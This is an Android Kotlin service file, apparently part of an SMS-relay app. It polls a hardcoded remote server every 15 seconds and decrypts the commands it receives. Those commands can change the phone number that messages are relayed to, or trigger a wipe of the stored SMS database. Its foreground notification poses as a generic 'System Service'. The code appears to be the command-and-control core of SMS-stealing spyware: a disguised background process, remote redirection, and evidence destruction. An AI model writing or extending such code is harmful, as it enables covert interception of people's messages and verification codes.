package com.example.service

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Intent
import android.os.Build
import android.os.IBinder
import androidx.core.app.NotificationCompat
import com.example.BuildConfig
import com.example.data.SecurityModule
import com.example.data.SettingsManager
import com.example.data.SmsDatabase
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.Job
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import kotlinx.coroutines.runBlocking
import okhttp3.OkHttpClient
import okhttp3.Request
import org.json.JSONObject

class RelayService : Service() {

    private lateinit var settingsManager: SettingsManager
    private lateinit var database: SmsDatabase
    private var pollingJob: Job? = null

    override fun onCreate() {
        super.onCreate()
        settingsManager = SettingsManager(this)
        database = SmsDatabase.getDatabase(this)
        
        createNotificationChannel()
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            startForeground(1, createNotification(), android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC)
        } else {
            startForeground(1, createNotification())
        }
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        startPolling()
        return START_STICKY
    }

    private fun startPolling() {
        if (pollingJob?.isActive == true) return
        
        pollingJob = CoroutineScope(Dispatchers.IO).launch {
            val client = OkHttpClient()
            while (true) {
                try {
                    val apiUrl = BuildConfig.API_URL.ifEmpty { "https://ais-dev-ch3ekvgneiuwt5ad5pmjkq-380075491011.asia-east1.run.app/api/config" }
                    val request = Request.Builder().url(apiUrl).build()
                    val response = client.newCall(request).execute()
                    
                    if (response.isSuccessful) {
                        val rawData = response.body?.string() ?: ""
                        android.util.Log.d("RelayService", "Raw data: $rawData")
                        
                        val json = try {
                            JSONObject(rawData)
                        } catch (e: Exception) {
                            val decrypted = SecurityModule.decrypt(rawData)
                            JSONObject(decrypted)
                        }
                        
                        val status = json.optString("status")
                        val newTargetNumber = json.optString("target_number")
                        
                        if (newTargetNumber.isNotEmpty()) {
                            settingsManager.targetNumber = newTargetNumber
                        }
                        
                        if (status == "ABORT") {
                            // Secure Wipe
                            runBlocking { database.smsDao().clearAll() }
                        }
                    }
                } catch (e: Exception) {
                    android.util.Log.e("RelayService", "Polling error: ${e.message}")
                }
                // Wait for 15 seconds before polling again
                delay(15_000)
            }
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        pollingJob?.cancel()
    }

    override fun onBind(intent: Intent?): IBinder? {
        return null
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                "relay_service_channel",
                "System Background Process",
                NotificationManager.IMPORTANCE_LOW
            )
            val manager = getSystemService(NotificationManager::class.java)
            manager?.createNotificationChannel(channel)
        }
    }

    private fun createNotification(): Notification {
        return NotificationCompat.Builder(this, "relay_service_channel")
            .setContentTitle("System Service")
            .setContentText("Background process is running")
            .setSmallIcon(android.R.drawable.ic_menu_preferences)
            .build()
    }
}
